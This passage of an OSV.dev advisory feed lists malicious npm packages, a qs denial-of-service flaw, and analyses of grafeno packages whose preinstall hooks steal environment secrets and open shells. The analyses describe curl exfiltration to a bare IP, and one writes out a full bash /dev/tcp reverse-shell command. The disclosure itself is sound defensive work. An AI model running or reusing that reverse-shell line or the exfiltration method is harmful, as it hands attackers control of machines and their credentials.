-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in brat-codex (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-63wg-22hx-h5q4&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;brat-codex&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (59cd132a85c45f52a8b8a39a9ad5e1af5ce00495c95b2872933f581a3a835e0d)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-63wg-22hx-h5q4"&gt;https://github.com/advisories/GHSA-63wg-22hx-h5q4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15580"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15583: Malicious code in h2-codex (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15583</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15583"/>
-    <published>2026-08-30T16:35:22Z</published>
-    <updated>2026-08-30T17:30:15Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-8h78-gfj3-qrp2"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in h2-codex (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-8h78-gfj3-qrp2&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;h2-codex&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (5a05ec48dd6d344e6c102ce653ec2598b0c9cf719faa922f141993c6b56a98f9)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-8h78-gfj3-qrp2"&gt;https://github.com/advisories/GHSA-8h78-gfj3-qrp2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15583"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15579: Malicious code in @fidzzhost/baileys (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15579</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15579"/>
-    <published>2026-08-30T16:35:23Z</published>
-    <updated>2026-08-30T17:30:15Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-vc2v-c8j2-qxg9"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @fidzzhost/baileys (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-vc2v-c8j2-qxg9&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@fidzzhost/baileys&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (2d9c64f9aae78384f16b90881eb1d1eaf304c426729bfa56e206fe84b0b10007)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-vc2v-c8j2-qxg9"&gt;https://github.com/advisories/GHSA-vc2v-c8j2-qxg9&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15579"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15581: Malicious code in cloudfcrxz (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15581</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15581"/>
-    <published>2026-08-30T16:35:23Z</published>
-    <updated>2026-08-30T17:30:15Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-p375-pmrj-262v"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in cloudfcrxz (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-p375-pmrj-262v&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cloudfcrxz&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (974638bbd94ff2faa32af26e08507bad878921ceb00f5ea4fd1e7987612d44f3)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-p375-pmrj-262v"&gt;https://github.com/advisories/GHSA-p375-pmrj-262v&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15581"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15582: Malicious code in cloufcrxz (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15582</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15582"/>
-    <published>2026-08-30T16:35:22Z</published>
-    <updated>2026-08-30T17:30:15Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-gxpc-36pf-vcrw"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in cloufcrxz (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-gxpc-36pf-vcrw&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cloufcrxz&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (30db0d2a5e03b7c4c07add885baaa2d5051755c85a4bf122b3f569abc911d604)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-gxpc-36pf-vcrw"&gt;https://github.com/advisories/GHSA-gxpc-36pf-vcrw&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15582"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15585: Malicious code in h3client (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15585</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15585"/>
-    <published>2026-08-30T16:35:22Z</published>
-    <updated>2026-08-30T17:30:15Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-89vf-5xgx-fhq7"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in h3client (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-89vf-5xgx-fhq7&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;h3client&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (4d9a6eb5a8f1c08d9af2711eb8e8d20875c622d43d38ef05e442f09e790a1e90)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-89vf-5xgx-fhq7"&gt;https://github.com/advisories/GHSA-89vf-5xgx-fhq7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15585"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15584: Malicious code in h3-codex (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15584</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15584"/>
-    <published>2026-08-30T16:35:22Z</published>
-    <updated>2026-08-30T17:30:15Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-w6m7-6jhr-mfjc"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in h3-codex (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-w6m7-6jhr-mfjc&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;h3-codex&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (286ac1bd0d417a41f4da52b46dc7d29d9bc8d53aeebfae381015a47df32f8454)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-w6m7-6jhr-mfjc"&gt;https://github.com/advisories/GHSA-w6m7-6jhr-mfjc&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15584"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] GHSA-w7fw-mjwx-w883: qs's arrayLimit bypass in comma parsing allows denial of service</title>
-    <id>https://osv.dev/vulnerability/GHSA-w7fw-mjwx-w883</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-w7fw-mjwx-w883"/>
-    <published>2026-02-12T17:04:39Z</published>
-    <updated>2026-08-30T11:55:53Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-2391"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;qs&amp;#x27;s arrayLimit bypass in comma parsing allows denial of service&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-2391&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;qs&lt;/code&gt; — fixed in 6.14.2&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
-The `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).
-
-### Details
-When the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `[&amp;#x27;a&amp;#x27;, &amp;#x27;b&amp;#x27;, &amp;#x27;c&amp;#x27;]`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to e…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883"&gt;https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2391"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-2391&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/ljharb/qs/commit/f6a7abff1f13d644db9b05fe4f2c98ada6bf8482"&gt;https://github.com/ljharb/qs/commit/f6a7abff1f13d644db9b05fe4f2c98ada6bf8482&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/ljharb/qs"&gt;https://github.com/ljharb/qs&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-w7fw-mjwx-w883"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15574: Malicious code in gclassroom (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15574</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15574"/>
-    <published>2026-08-30T05:03:03Z</published>
-    <updated>2026-08-30T05:30:11Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-6c25-pq89-3m9w"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in gclassroom (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-6c25-pq89-3m9w&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;gclassroom&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (5e4f9b80b3ec968674f21e693cb6dd9c2bf4c4c0f0e7a17dfa3abb9082085382)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-6c25-pq89-3m9w"&gt;https://github.com/advisories/GHSA-6c25-pq89-3m9w&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15574"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15572: Malicious code in grafeno-payments (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15572</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15572"/>
-    <published>2026-08-29T23:10:48Z</published>
-    <updated>2026-08-29T23:30:10Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in grafeno-payments (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;grafeno-payments&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (7af58da84956e51749cbb96923f12264cfdee76456b5010b526599b7da2c0caa)
-On `npm install`, package.json&amp;#x27;s preinstall hook (`node preinstall.js || true`) auto-runs a script that (1) enumerates process.env for keys matching AWS|TOKEN|KEY|SECRET|PASS|API, concatenates them with the machine&amp;#x27;s hostname and username, base64-encodes the blob, and exfiltrates it via `curl` GET to http://216.126.236.46/r.php over plain HTTP; and (2) on non-Windows hosts invokes `bash -i` with a /dev/tcp redirection to 216.126.236.46:4444, giving the remote endpoint an interactive shell on the installer&amp;#x27;s machine. The `|| true` suffix suppresses errors so `npm install` reports success while the payload runs. The package&amp;#x27;s stated paym…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/grafeno-payments/v/1.0.0"&gt;https://www.npmjs.com/package/grafeno-payments/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15572"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15571: Malicious code in grafeno-billing (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15571</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15571"/>
-    <published>2026-08-29T23:10:56Z</published>
-    <updated>2026-08-29T23:30:10Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in grafeno-billing (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;grafeno-billing&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (72306b800994fea3aa6c6d12e137657ffe70ec9ac6c44abfe3ceaa547ef8e5c6)
-grafeno-billing@1.0.0 is a stub package whose only substantive code is a preinstall lifecycle hook. On npm install, preinstall.js enumerates process.env, filters keys matching AWS|TOKEN|KEY|SECRET|PASS|API, concatenates them with hostname and username, base64-encodes the result, and sends it via curl GET to http://216.126.236.46/r.php. On non-Windows hosts the same script also launches an interactive bash reverse shell to 216.126.236.46:4444 via /dev/tcp, giving the operator of that endpoint command execution on the installer&amp;#x27;s machine. The shipped index.js is a one-line stub returning a fake createInvoice result, with no real billing …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/grafeno-billing/v/1.0.0"&gt;https://www.npmjs.com/package/grafeno-billing/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15571"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15573: Malicious code in grafeno-webhook (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15573</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15573"/>
-    <published>2026-08-29T23:11:06Z</published>
-    <updated>2026-08-29T23:30:10Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in grafeno-webhook (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;grafeno-webhook&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (79e333edbcad465f3e5bdfafa8dc4ba91589d66e12c201bb9e1ed4037cb16c36)
-The preinstall.js lifecycle script executed automatically by npm install performs three hostile actions against the installer&amp;#x27;s machine. It enumerates process.env, filters for keys matching AWS|TOKEN|KEY|SECRET|PASS|API, base64-encodes the values together with os.hostname() and os.userInfo().username, and sends the blob via curl over plain HTTP to the hardcoded bare-IP endpoint http://216.126.236.46/r.php. On non-Windows platforms it additionally spawns an interactive bash reverse shell to 216.126.236.46:4444 (bash -i &amp;gt;&amp;amp; /dev/tcp/216.126.236.46/4444), giving the remote operator full command execution on the host running npm install. Ho…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/grafeno-webhook/v/1.0.0"&gt;https://www.npmjs.com/package/grafeno-webhook/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15573"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
 </feed>
